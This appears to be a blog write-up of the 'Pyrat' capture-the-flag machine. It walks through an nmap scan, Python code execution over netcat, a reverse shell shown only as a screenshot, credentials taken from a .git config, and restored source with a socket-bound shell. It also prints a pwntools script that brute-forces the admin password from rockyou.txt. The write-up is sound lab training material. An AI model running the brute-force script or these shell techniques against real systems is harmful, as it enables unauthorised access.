{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("Let's begin by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.209.122", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:23 CET
Nmap scan report for 10.10.209.122
Host is up (0.090s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
")}}

{{text("After visiting the site on port 8000, we encountered the following.")}}

{{image("../../static/images/pyrat/000001.jpg")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Initially, I tried using Burp Suite, but it didn't lead anywhere. Then, I used netcat to connect to the address. Since it was stated that <code class='bg-gray-300 rounded-md px-1'>a HTTP response leads to a Python code vulnerability</code>, I immediately attempted to run Python code.")}}

{{console("nc 10.10.209.122 8000", "l
name 'l' is not defined
test
name 'test' is not defined
print(2)
2
")}}

{{text("Since it worked, I used a Python reverse shell from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code> and attempted to get it running.")}}

{{image("../../static/images/pyrat/000002.jpg")}}

{{text("This worked, and now we were the <code class='bg-gray-300 rounded-md px-1'>www-data</code> user.")}}

{{header("Shell as think", "shell-as-think")}}

{{text("While exploring the system, I discovered a <code class='bg-gray-300 rounded-md px-1'>.git</code> directory inside <code class='bg-gray-300 rounded-md px-1'>/opt/dev</code>.")}}

{{text("The challenge description mentioned we should <code class='bg-gray-300 rounded-md px-1'>explore the application's older version</code>, so I decided to investigate further.")}}

{{text("Inside the <code class='bg-gray-300 rounded-md px-1'>.git</code> directory, I came across an old <code class='bg-gray-300 rounded-md px-1'>config</code> file containing user credentials.")}}

{{console("cat config", "[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential 'https://github.com']
        username = think
        password = [REDACTED]")}}

{{text("We switched users to <code class='bg-gray-300 rounded-md px-1'>think</code> and successfully logged in using the newly obtained password.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Next, we navigated to <code class='bg-gray-300 rounded-md px-1'>/opt/dev</code> to check for the older version of the application.")}}

{{console("git status", "On branch master
Changes not staged for commit:
  (use 'git add/rm <file>...' to update what will be committed)
  (use 'git restore <file>...' to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use 'git add' and/or 'git commit -a')")}}

{{text("We noticed that <code class='bg-gray-300 rounded-md px-1'>pyrat.py.old</code> had been deleted. Let's attempt to restore that file.")}}

{{image("../../static/images/pyrat/000003.jpg")}}

{{text("Now, we can read the contents of the restored file.")}}

{{console("cat pyrat.py.old", "def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if not approved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn('/bin/sh')")}}

{{text("We can see that if <code class='bg-gray-300 rounded-md px-1'>data == 'shell'</code>, the <code class='bg-gray-300 rounded-md px-1'>shell</code> function is executed, which spawns a shell.")}}

{{text("Let's try connecting to our target again using netcat and input <code class='bg-gray-300 rounded-md px-1'>shell</code>.")}}

{{image("../../static/images/pyrat/000004.jpg")}}

{{text("It works, but unfortunately, we are still the <code class='bg-gray-300 rounded-md px-1'>www-data</code> user.")}}

{{text("It seems that the key is to correctly guess the <code class='bg-gray-300 rounded-md px-1'>some_endpoint</code>.")}}

{{text("To be honest, I didn't feel like writing a script for it, so I started guessing since this is an easy challenge, and I got lucky.")}}

{{image("../../static/images/pyrat/000005.jpg")}}

{{text("We need the admin's password, so I guess that's karma. I wrote a script to guess the password.")}}

{{console("from pwn import *

server = '10.10.88.128'
port_number = 8000
wordlist_path = '/usr/share/wordlists/rockyou.txt'

def create_connection():
    return remote(server, port_number)

def try_login(password_guess):
    session = create_connection()
    session.sendline(b'admin')
    session.recvuntil(b'Password:')
    session.sendline(password_guess.encode())
    feedback = session.recvline(timeout=2)
    feedback = session.recvline(timeout=2)
    if b'Password:' in feedback:
        print(f'Attempt with \'{password_guess}\' failed.')
        session.close()
        return False
    elif b'Welcome' in feedback or b'Success' in feedback:
        print(f'Potential success with \'{password_guess}\'!')
        session.close()
        return True
    else:
        print(f'Unexpected feedback for \'{password_guess}\': {feedback}')
        session.close()
        return False

def brute_force_password():
    with open(wordlist_path, 'r', encoding='latin-1') as wordlist:
        for password in wordlist:
            password = password.strip()
            if try_login(password):
                print(f'Valid password identified: {password}')
                break

if __name__ == '__main__':
    brute_force_password()")}}

{{text("We got the password almost immediately.")}}

{{image("../../static/images/pyrat/000006.jpg")}}

{{text("After logging in as admin, we gained root access. Now, we just need to go to <code class='bg-gray-300 rounded-md px-1'>/root</code> and retrieve our flag.")}}

{{image("../../static/images/pyrat/000007.jpg")}}

{{script()}}  
